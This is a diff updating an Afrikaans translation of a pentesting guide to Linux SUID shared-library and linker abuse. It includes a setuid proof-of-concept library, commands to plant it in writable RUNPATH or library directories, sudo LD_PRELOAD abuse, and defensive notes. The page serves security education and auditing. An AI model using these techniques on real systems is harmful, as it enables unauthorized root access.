@@ -1,21 +1,21 @@
-# SUID Shared Library en Linker Abuse
+# SUID Shared Library- en Linker Abuse
 
 {{#include ../../banners/hacktricks-training.md}}
 
-SUID-binaries word gewoonlik nagegaan vir direkte command execution, maar custom SUID-programme kan ook kwesbaar wees deur die dynamic linker. Die algemene tema is eenvoudig: ’n bevoorregte executable laai code vanaf ’n path of configuration wat ’n gebruiker met laer privileges kan beïnvloed.
+SUID binaries word gewoonlik nagegaan vir direkte command execution, maar custom SUID-programme kan ook deur die dynamic linker kwesbaar wees. Die algemene tema is eenvoudig: ’n bevoorregte executable laai code vanaf ’n path of configuration wat ’n gebruiker met laer privileges kan beïnvloed.
 
-Hierdie bladsy fokus op generiese technique patterns: ontbrekende libraries, writable library directories, `RPATH`/`RUNPATH`, `LD_PRELOAD` deur sudo, linker configuration, en SUID-hardlink confusion.
+Hierdie bladsy fokus op generiese technique patterns: ontbrekende libraries, writable library directories, `RPATH`/`RUNPATH`, `LD_PRELOAD` deur sudo, linker configuration, en SUID-hardlinkverwarring.
 
-## Vinnige Enumerasie
+## Vinnige Enumeration
 
-Begin deur ongewone SUID-files te vind en te kontroleer of hulle dynamically linked is:
+Begin deur ongewone SUID-lêers te vind en te kontroleer of hulle dynamically linked is:
 ```bash
 find / -perm -4000 -type f -ls 2>/dev/null
 file /path/to/suid-binary
 ldd /path/to/suid-binary 2>/dev/null
 readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
 ```
-Fokus op nie-standaardliggings, pasgemaakte toepassingspaaie, binaries wat deur root besit word maar buite pakketbestuurde gidse is, en afhanklikhede wat vanaf skryfbare gidse gelaai word.
+Fokus op nie-standaardliggings, pasgemaakte toepassingspaaie, binaries wat deur root besit word maar buite pakketbestuurde gidse is, en dependencies wat vanaf skryfbare gidse gelaai word.
 
 Nuttige skryfbaarheidstoetse:
 ```bash
@@ -25,13 +25,13 @@ find / -writable -type d 2>/dev/null | head -n 50
 ```
 ## Missing Shared Object Injection
 
-Sommige pasgemaakte SUID-binêre lêers probeer om ’n shared object te laai wat nie bestaan nie. As die ontbrekende pad onder ’n gids is wat deur die aanvaller beheer word, kan die binêre lêer aanvaller-verskafde kode as die effektiewe gebruiker laai.
+Some custom SUID binaries probeer om ’n shared object te laai wat nie bestaan nie. Indien die ontbrekende pad onder ’n directory is wat deur die aanvaller beheer word, kan die binary attacker-supplied code as die effective user laai.
 
-Vind mislukte biblioteekopsoeke:
+Vind mislukte library lookups:
 ```bash
 strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
 ```
-As die binary ’n skryfbare pad vir `libexample.so` deursoek, kan ’n minimale proof library ’n constructor gebruik. Hou die bewys van impak skadeloos tydens validering:
+As die binary 'n skryfbare pad vir `libexample.so` deursoek, kan 'n minimale bewysbiblioteek 'n constructor gebruik. Hou die impakbewys skadeloos tydens validering:
 ```c
 #include <stdlib.h>
 #include <unistd.h>
@@ -43,31 +43,31 @@ setgid(0);
 system("id > /tmp/suid-so-ran");
 }
 ```
-Bou dit met die presiese lêernaam wat die binêre lêer probeer laai:
+Bou dit met die presiese lêernaam wat die binary probeer laai:
 ```bash
 gcc -shared -fPIC proof.c -o /writable/path/libexample.so
 /path/to/suid-binary
 cat /tmp/suid-so-ran
 ```
-Die uitbuitbare toestand is nie slegs die ontbrekende biblioteek nie. Die aanvaller moet ’n versoenbare shared object kan plaas by ’n pad wat die bevoorregte laaier sal aanvaar.
+Die uitbuitbare toestand is nie slegs die ontbrekende library nie. Die aanvaller moet ’n versoenbare shared object by ’n pad kan plaas wat die bevoorregte loader sal aanvaar.
 
-## Skryfbare Biblioteekgids
+## Skryfbare Library Directory
 
-Soms bestaan alle afhanklikhede, maar een van die gidse wat gebruik word om dit op te los, is skryfbaar. Dit kan die vervanging van ’n gelaaide biblioteek of die plasing van ’n biblioteek met hoër prioriteit en dieselfde naam moontlik maak.
+Soms bestaan al die dependencies, maar een van die directories wat gebruik word om hulle op te spoor, is skryfbaar. Dit kan dit moontlik maak om ’n gelaaide library te vervang of ’n library met dieselfde naam met hoër prioriteit te plant.
 
-Hersien afhanklikheidspaaie:
+Hersien dependency-paaie:
 ```bash
 ldd /path/to/suid-binary 2>/dev/null
 readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
 namei -om /path/to/library.so
 ```
-Indien die gids skryfbaar is, valideer dit met ’n kopie-veilige benadering in ’n lab. Die vervanging van stelselbiblioteke op ’n aktiewe host kan authentication, package management of selflaai-kritieke dienste breek.
+As die gids skryfbaar is, valideer dit met ’n copy-safe-benadering in ’n lab. Die vervanging van stelselbiblioteke op ’n aktiewe host kan authentication, package management of boot-critical services breek.
 
 ## RPATH en RUNPATH
 
-`RPATH` en `RUNPATH` is dynamic-section-inskrywings wat vir die loader aandui waar om na biblioteke te soek. Hulle is gevaarlik in SUID-programme wanneer hulle na gidsse wys wat deur ’n aanvaller beskryfbaar is.
+`RPATH` en `RUNPATH` is dynamic-section-inskrywings wat vir die loader aandui waar om na biblioteke te soek. Hulle is gevaarlik in SUID-programme wanneer hulle na aanvaller-skryfbare gidse wys.
 
-Bespeur hulle:
+Detect hulle:
 ```bash
 readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
 objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
@@ -77,23 +77,23 @@ Voorbeeld van riskante uitvoer:
 0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
 0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
 ```
-As `/opt/app/lib` skryfbaar is en die binary `libcustom.so` benodig, kan die aanvaller moontlik ’n kwaadwillige `libcustom.so` daar plaas:
+Indien `/opt/app/lib` skryfbaar is en die binary `libcustom.so` benodig, kan die aanvaller moontlik ’n kwaadwillige `libcustom.so` daar plaas:
 ```bash
 ls -ld /opt/app/lib
 gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
 /path/to/suid-binary
 ```
-`RPATH` en `RUNPATH` is nie identies in alle resolusiebesonderhede nie, maar vir privilege-escalation review is die praktiese vraag dieselfde: soek die SUID binary in ’n directory wat deur ’n attacker geskryf kan word na ’n library name?
+`RPATH` en `RUNPATH` is nie identies wat alle resolusiebesonderhede betref nie, maar vir privilege-escalation-oorsig is die praktiese vraag dieselfde: soek die SUID-binary na ’n library-naam in ’n directory wat deur ’n aanvaller geskryf kan word?
 
 ## LD_PRELOAD, LD_LIBRARY_PATH en SUID
 
-Vir normale programme kan `LD_PRELOAD` en `LD_LIBRARY_PATH` die laai van shared objects afdwing of beïnvloed. Vir SUID-programme gaan die dynamic loader normaalweg na secure-execution mode en ignoreer gevaarlike environment variables.
+Vir normale programme kan `LD_PRELOAD` en `LD_LIBRARY_PATH` die laai van shared objects afdwing of beïnvloed. Vir SUID-programme gaan die dynamic loader normaalweg na secure-execution mode en ignoreer dit gevaarlike environment variables.
 
-Dit beteken dat ’n gewone SUID binary gewoonlik nie kwesbaar is net omdat die user `LD_PRELOAD` kan stel nie:
+Dit beteken dat ’n gewone SUID-binary gewoonlik nie kwesbaar is bloot omdat die gebruiker `LD_PRELOAD` kan stel nie:
 ```bash
 LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
 ```
-Die algemene uitsondering is sudo-wanopstelling. As `sudo -l` wys dat ’n veranderlike soos `LD_PRELOAD` of `LD_LIBRARY_PATH` behou word, kan ’n opdrag wat deur sudo toegelaat word, aanvaller-beheerde kode laai:
+Die algemene uitsondering is sudo-wanopstelling. As `sudo -l` wys dat ’n veranderlike soos `LD_PRELOAD` of `LD_LIBRARY_PATH` behoue bly, kan ’n sudo-toegelate opdrag aanvaller-beheerde kode laai:
 ```bash
 sudo -l
 # Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
@@ -101,30 +101,30 @@ sudo LD_PRELOAD=/tmp/proof.so /allowed/command
 ```
 Moenie hierdie gevalle verwar nie:
 
-- `LD_PRELOAD` teenoor ’n normale SUID-binêre lêer: gewoonlik deur secure execution geblokkeer.
-- `LD_PRELOAD` wat deur sudo behou word: moontlik uitbuitbaar.
-- Ontbrekende `.so` in ’n skryfbare pad: uitbuitbaar wanneer die SUID-binêre lêer daardie pad natuurlik laai.
-- `RPATH`/`RUNPATH` na ’n skryfbare gids: uitbuitbaar wanneer ’n nodige library beheer kan word.
-- Skryftoegang tot `/etc/ld.so.preload` of linker-konfigurasie: stelselwyd en met ’n groot impak.
+- `LD_PRELOAD` teenoor 'n normale SUID-binary: word gewoonlik deur secure execution geblokkeer.
+- `LD_PRELOAD` wat deur sudo behou word: kan moontlik uitgebuit word.
+- Ontbrekende `.so` in 'n skryfbare pad: kan uitgebuit word wanneer die SUID-binary daardie pad natuurlik laai.
+- `RPATH`/`RUNPATH` na 'n skryfbare gids: kan uitgebuit word wanneer 'n nodige library beheer kan word.
+- Skryftoegang tot `/etc/ld.so.preload` of linker-konfigurasie: stelselwyd en met 'n groot impak.
 
 ## Linker-konfigurasie
 
-Die dynamic linker lees ook stelselkonfigurasie soos `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, die linker-cache, en in sommige gevalle `/etc/ld.so.preload`.
+Die dynamic linker lees ook stelselkonfigurasie soos `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, die linker-cache en, in sommige gevalle, `/etc/ld.so.preload`.
 
-Kontroles met hoë waarde:
+Belangrike kontroles:
 ```bash
 ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
 find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
 find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
 ldconfig -v 2>/dev/null | head -n 50
 ```
-Skryfbare linker-konfigurasie is gewoonlik ernstiger as ’n enkele kwesbare SUID-binêre, omdat dit baie dinamies gekoppelde prosesse kan beïnvloed. `/etc/ld.so.preload` is veral gevaarlik omdat dit ’n shared object in bevoorregte prosesse kan forseer.
+Skryfbare linker configuration is gewoonlik ernstiger as een kwesbare SUID binary, omdat dit baie dynamically linked processes kan beïnvloed. `/etc/ld.so.preload` is besonder gevaarlik omdat dit ’n shared object in privileged processes kan afdwing.
 
 ## SUID Hardlink Confusion
 
-Hardlinks kan veroorsaak dat dieselfde SUID-inode onder verskeie name verskyn. Dit is nuttig om ’n bevoorregte helper weg te steek, opruiming te verwar of naïewe padgebaseerde hersiening te omseil.
+Hardlinks kan veroorsaak dat dieselfde SUID inode onder verskeie name verskyn. Dit is nuttig om ’n privileged helper weg te steek, cleanup te verwar of naïewe path-based review te omseil.
 
-Vind SUID-lêers met meer as een skakel:
+Vind SUID-lêers met meer as een link:
 ```bash
 find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
 ```
@@ -133,14 +133,15 @@ Inspekteer alle paaie na dieselfde inode:
 stat /path/to/suid-wrapper
 find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
 ```
-Die misbruik is nie dat ’n hardlink toestemmings verander nie. Die misbruik is padverwarring: ’n bevoorregte inode kan bereikbaar wees deur ’n naam wat verdedigers of skripte nie verwag nie. Vir ’n dieper verduideliking van inode- en hardlink-werkvloei, sien [Lêerstelsel, Inodes en Herstel](../main-system-information/filesystem-inodes-and-recovery.md).
+Die misbruik is nie dat ’n hardlink toestemmings verander nie. Die misbruik is path confusion: ’n bevoorregte inode kan bereikbaar wees deur ’n naam wat verdedigers of scripts nie verwag nie. Vir ’n dieper oorsig van inode- en hardlink-werkvloeie, sien [Lêerstelsel, Inodes en Herstel](../main-system-information/filesystem-inodes-and-recovery.md).
 
 ## Verdedigingsnotas
 
 - Hou SUID-binaries minimaal, geoudit en waar moontlik deur pakkette bestuur.
-- Vermy `RPATH`-/`RUNPATH`-inskrywings wat na skryfbare of toepassingsbestuurde gidse wys.
-- Hou biblioteekgidse in root se besit en nie-skryfbaar vir gewone gebruikers.
-- Moenie `LD_PRELOAD`, `LD_LIBRARY_PATH` of soortgelyke loader-veranderlikes deur sudo behou nie.
+- Vermy `RPATH`/`RUNPATH`-inskrywings wat na skryfbare of toepassingsbestuurde gidse wys.
+- Hou biblioteekgidse in besit van root en nie-skryfbaar vir gewone gebruikers nie.
+- Moenie `LD_PRELOAD`, `LD_LIBRARY_PATH` of soortgelyke laaier-veranderlikes deur sudo behou nie.
 - Monitor `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` en onverwagte SUID-lêers.
-- Hersien hardlinked SUID-lêers en ondersoek pasgemaakte SUID-wrappers buite standaardstelselpaaie.
+- Hersien hardgekoppelde SUID-lêers en ondersoek pasgemaakte SUID-wrappers buite standaardstelselpaaie.
+
 {{#include ../../banners/hacktricks-training.md}}
